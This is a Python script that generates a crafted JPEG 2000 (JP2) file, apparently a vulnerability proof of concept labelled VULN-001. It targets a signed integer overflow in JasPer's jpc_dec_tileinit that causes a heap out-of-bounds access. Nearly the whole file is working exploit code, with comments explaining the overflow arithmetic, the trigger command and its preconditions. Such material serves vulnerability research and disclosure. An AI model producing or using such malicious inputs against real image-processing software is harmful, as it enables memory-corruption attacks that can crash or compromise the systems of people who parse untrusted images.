#!/usr/bin/env python3
"""
VULN-001: Signed Integer Overflow in numprcs Leads to Heap OOB Read/Write
JasPer imginfo - jpc_dec_tileinit() integer overflow PoC generator

Key: numDecompLvls=0 (1 resolution level), prcwidthexpn=prcheightexpn=0
=> numhprcs = numvprcs = 65537 (tile_width)
=> numprcs = 65537 * 65537 = 4295098369 > INT_MAX => SIGNED OVERFLOW => truncated to 131073
=> under-allocated band->prcs and pirlvl->prclyrnos (131073 entries)
=> pirlvl->numhprcs = 65537 (true value preserved)
=> RPCL packet iterator: prcno = prcvind * 65537 + prchind
   At y=1, x=65536: prcno = 1*65537 + 65536 = 131073 >= 131073 => OOB

Prerequisites for trigger:
  imginfo --max-samples 0 -f evil.jp2
  (--max-samples 0 bypasses the 67M sample limit check in jpc_dec_process_siz)
"""

import struct
import os

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(POC_DIR, "vuln_001.jp2")


def u8(v):
    return struct.pack(">B", v)

def u16(v):
    return struct.pack(">H", v)

def u32(v):
    return struct.pack(">I", v)

def make_box(box_type, data):
    """Create JP2 box: length(4B BE) + type(4B) + data"""
    assert len(box_type) == 4
    total_len = 8 + len(data)
    return struct.pack(">I", total_len) + box_type.encode() + data

def build_jp2():
    # =========================================================
    # JP2 Signature Box
    # =========================================================
    sig_box = b'\x00\x00\x00\x0C\x6A\x50\x20\x20\x0D\x0A\x87\x0A'

    # =========================================================
    # File Type Box
    # =========================================================
    ftyp_data = (
        b'jp2 '   # brand
        + b'\x00\x00\x00\x00'  # minor version
        + b'jp2 '  # compatibility
    )
    ftyp_box = make_box('ftyp', ftyp_data)

    # =========================================================
    # JP2 Header Box (jp2h) containing ihdr + colr
    # =========================================================
    # ihdr: height=65537, width=65537, ncomp=1, bpc=7 (8-bit), c=7, unk=0, ip=0
    ihdr_data = (
        u32(65537)   # height
        + u32(65537) # width
        + u16(1)     # ncomp
        + u8(7)      # bpc (8-bit unsigned)
        + u8(7)      # compression type
        + u8(0)      # unknown colorspace
        + u8(0)      # IP header
    )
    ihdr_box = make_box('ihdr', ihdr_data)

    # colr: meth=1 (enumerated CS), prec=0, approx=0, enumCS=17 (grayscale)
    colr_data = (
        u8(1)    # meth
        + u8(0)  # prec
        + u8(0)  # approx
        + u32(17) # enumCS = 17 (grayscale)
    )
    colr_box = make_box('colr', colr_data)

    jp2h_data = ihdr_box + colr_box
    jp2h_box = make_box('jp2h', jp2h_data)

    # =========================================================
    # JPEG-2000 Codestream
    # =========================================================
    # SOC marker
    soc = b'\xFF\x4F'

    # SIZ marker
    # Rsiz=0, Xsiz=65537, Ysiz=65537, XOsiz=0, YOsiz=0,
    # XTsiz=65537, YTsiz=65537, XTOsiz=0, YTOsiz=0, Csiz=1
    # Component: Ssiz=7 (8-bit unsigned), XRsiz=1, YRsiz=1
    siz_payload = (
        u16(0)       # Rsiz
        + u32(65537) # Xsiz
        + u32(65537) # Ysiz
        + u32(0)     # XOsiz
        + u32(0)     # YOsiz
        + u32(65537) # XTsiz (single tile = full image)
        + u32(65537) # YTsiz (single tile = full image)
        + u32(0)     # XTOsiz
        + u32(0)     # YTOsiz
        + u16(1)     # Csiz (1 component)
        # Component 0
        + u8(7)      # Ssiz: 8-bit unsigned
        + u8(1)      # XRsiz
        + u8(1)      # YRsiz
    )
    siz_len = 2 + len(siz_payload)  # length field includes itself
    siz = b'\xFF\x51' + u16(siz_len) + siz_payload

    # COD marker
    # Scod=0x01: explicit precinct sizes enabled
    # SGcod: ProgOrder=0x02 (RPCL), numLayers=0x0001, MCT=0x00
    # SPcod:
    #   numdlvls=0 (numDecompLvls=0 → numrlvls=1, no DWT decomposition)
    #   xcb=2 (code-block width = 2^(2+2) = 16 pixels)
    #   ycb=2 (code-block height = 16 pixels)
    #   cblkstyle=0, Cmodes=0
    #   precinct_sizes: 1 byte for 1 resolution level
    #   0x00 → prcwidthexpn=0, prcheightexpn=0 (1×1 pixel precincts)
    #   ⟹ numhprcs = ceil(65537/1) = 65537
    #   ⟹ numvprcs = ceil(65537/1) = 65537
    #   ⟹ numprcs = 65537 * 65537 = 4295098369 > INT_MAX → SIGNED OVERFLOW
    #   ⟹ truncated to 131073 → under-allocated buffer
    cod_payload = (
        u8(0x01)    # Scod: explicit precinct sizes
        # SGcod
        + u8(0x02)  # progression order = RPCL
        + u16(1)    # numLayers = 1
        + u8(0)     # MCT = 0 (no multiple component transform)
        # SPcod
        + u8(0)     # numdlvls = 0 (zero DWT decomposition levels)
        + u8(2)     # xcb - 2 = 2 → code-block width = 16
        + u8(2)     # ycb - 2 = 2 → code-block height = 16
        + u8(0)     # cblkstyle
        + u8(0)     # Cmodes
        # precinct_sizes: 1 byte for numrlvls=1 resolution level
        # For rlvlno=0 (the only level): 0x00 → 1×1 pixel precincts
        + u8(0x00)  # precinct_size[0]: prcwidthexpn=0, prcheightexpn=0
    )
    cod_len = 2 + len(cod_payload)
    cod = b'\xFF\x52' + u16(cod_len) + cod_payload

    # QCD marker (required for jpc_dec_cp_isvalid to succeed)
    # Without QCD, jpc_dec_cp_isvalid returns 0 → decoder rejects the stream
    #
    # Format: FF 5C + Lqcd(2B) + Sqcd(1B) + step_sizes(N bytes for NOQNT)
    # With numDecompLvls=0 → numrlvls=1 → 1 band (LL)
    # Need numstepsizes >= 3*numrlvls-2 = 1 for NOQNT (qntsty=0)
    # Sqcd = 0x20: numguard=1 (bits 7:5 = 001), qntsty=0x00=NOQNT (bits 4:0 = 00000)
    # Step size byte: exponent = 8 for 8-bit image → byte = (8 & 0x1f) << 3 = 0x40
    # Lqcd = 2 (length itself) + 1 (Sqcd) + 1 (step size) = 4
    qcd = b'\xFF\x5C' + u16(4) + u8(0x20) + u8(0x40)

    # SOT marker + SOD + tile data
    #
    # Tile data: 150000 bytes of \x00
    # Each \x00 byte → 1 empty JPEG2000 packet (1 bit=0 = "empty packet",
    # then 7 fill bits = 0 which pass the alignment check).
    # We need ~131073 empty packets before the OOB occurs.
    # (65537 packets for y=0 row + 65536 packets for y=1, x=0..65535)
    # The OOB happens at the NEXT jpc_pi_nextrpcl call (y=1,x=65536,prcno=131073).
    #
    # Note: this requires --max-samples 0 to bypass the 67M sample limit check,
    # AND ~34 GB RAM for the tile component matrix (65537×65537 × 8 bytes).
    tile_data_len = 150000
    tile_data = b'\x00' * tile_data_len

    sod = b'\xFF\x93'

    # Psot = SOT header (12 bytes) + SOD (2 bytes) + tile_data
    psot = 12 + 2 + tile_data_len

    sot_payload = (
        u16(0)       # Isot: tile index 0
        + u32(psot)  # Psot: total tile part bytes (includes SOT header)
        + u8(0)      # TPsot: tile-part index
        + u8(1)      # TNsot: total number of tile-parts for this tile
    )
    sot_len = 2 + len(sot_payload)  # 10
    sot = b'\xFF\x90' + u16(sot_len) + sot_payload

    # EOC
    eoc = b'\xFF\xD9'

    # Assemble codestream
    codestream = soc + siz + cod + qcd + sot + sod + tile_data + eoc

    # Contiguous Codestream Box
    cs_box = make_box('jp2c', codestream)

    # =========================================================
    # Assemble full JP2 file
    # =========================================================
    jp2 = sig_box + ftyp_box + jp2h_box + cs_box

    return jp2


if __name__ == '__main__':
    data = build_jp2()
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(data)
    print(f"[+] Generated {OUTPUT_FILE} ({len(data)} bytes)")
    print(f"[+] Key parameters:")
    print(f"    SIZ: Xsiz=Ysiz=XTsiz=YTsiz=65537 (single huge tile)")
    print(f"    COD: Scod=0x01 (explicit precincts), ProgOrder=RPCL")
    print(f"    COD: numDecompLvls=0 (1 resolution level, no DWT)")
    print(f"    COD: precinct_size=0x00 (1×1 pixel precincts)")
    print(f"    Expected: numhprcs=numvprcs=65537")
    print(f"    Expected UBSAN: 65537*65537=4295098369 > INT_MAX")
    print(f"    Expected truncated numprcs: {4295098369 % (2**32)} (0x{4295098369 % (2**32):08x})")
    print(f"    Under-alloc: band->prcs[{4295098369 % (2**32)}], prclyrnos[{4295098369 % (2**32)}]")
    print(f"    OOB at prcno=131073 (y=1,x=65536): prcno >= numprcs={4295098369 % (2**32)}")
    print(f"    Tile data: 150000 zero bytes (~131073 empty packets before OOB)")
    print(f"    NOTE: requires imginfo --max-samples 0 + ~34GB RAM")
